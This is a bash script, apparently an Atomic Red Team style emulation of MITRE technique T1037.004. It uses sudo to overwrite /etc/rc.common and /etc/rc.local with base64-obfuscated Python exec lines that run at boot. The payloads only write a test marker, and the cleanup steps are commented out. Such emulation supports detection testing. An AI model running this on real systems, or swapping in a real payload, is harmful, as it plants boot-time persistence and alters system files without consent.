#!/bin/bash

OUTPUT_DIR="Linux_output/Privilege_Escalation"
OUTPUT_FILE="$OUTPUT_DIR/T1037.004_Privilege_Escalation.txt"

# Create output directory if it doesn't exist
mkdir -p "$OUTPUT_DIR"

# Function to perform the attack and cleanup for rc.common
function rc_common_attack {
    # Create or backup rc.common
    filename='/etc/rc.common'
    if [ ! -f "$filename" ]; then
        sudo touch "$filename"
    else
        sudo cp "$filename" /etc/rc.common.original
    fi

    # Modify rc.common
    printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common > /dev/null
    echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\"" | sudo tee -a /etc/rc.common > /dev/null
    printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common > /dev/null
    sudo chmod +x /etc/rc.common
}

# Function to cleanup rc.common
function rc_common_cleanup {
    origfilename='/etc/rc.common.original'
    if [ ! -f "$origfilename" ]; then
        sudo rm /etc/rc.common
    else
        sudo cp "$origfilename" /etc/rc.common
        sudo rm "$origfilename"
    fi
}

# Function to perform the attack and cleanup for rc.local
function rc_local_attack {
    # Create or backup rc.local
    filename='/etc/rc.local'
    if [ ! -f "$filename" ]; then
        sudo touch "$filename"
    else
        sudo cp "$filename" /etc/rc.local.original
    fi

    # Modify rc.local
    if [ "$(uname)" = 'FreeBSD' ]; then
        printf '#!/usr/local/bin/bash\n' | sudo tee /etc/rc.local > /dev/null
    else
        printf '#!/bin/bash\n' | sudo tee /etc/rc.local > /dev/null
    fi
    echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\"" | sudo tee -a /etc/rc.local > /dev/null
    printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.local > /dev/null
    sudo chmod +x /etc/rc.local
}

# Function to cleanup rc.local
function rc_local_cleanup {
    origfilename='/etc/rc.local.original'
    if [ ! -f "$origfilename" ]; then
        sudo rm /etc/rc.local
    else
        sudo cp "$origfilename" /etc/rc.local
        sudo rm "$origfilename"
    fi
}

# Function to verify the modifications and save to output file
function verify_modifications {
    echo "Verifying rc.common modification:"
    echo "---------------------------------"
    cat /etc/rc.common
    echo

    echo "Verifying rc.local modification:"
    echo "--------------------------------"
    cat /etc/rc.local
    echo

    # Save output to the specified file
    {
        echo "Verifying rc.common modification:"
        echo "---------------------------------"
        cat /etc/rc.common
        echo

        echo "Verifying rc.local modification:"
        echo "--------------------------------"
        cat /etc/rc.local
        echo
    } | sudo tee "$OUTPUT_FILE" > /dev/null
}

# Execute the attacks
rc_common_attack
rc_local_attack

# Verify modifications and save output to file
verify_modifications

# Cleanup after verification (uncomment the following lines to clean up)
# rc_common_cleanup
# rc_local_cleanup
